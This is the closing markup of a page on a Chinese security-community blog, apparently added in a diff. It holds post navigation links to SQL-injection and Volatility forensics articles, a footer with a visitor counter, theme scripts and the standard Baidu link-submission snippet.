+    <a href="/20230327/penetration-testing-guide/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/20230327/ctf/volatility%E5%8F%96%E8%AF%81/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">助安社区 <a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">京ICP备2022030632号-1 </a>  all right reserved</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://blog.sechelper.com/" class="theme-link">sechelper</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
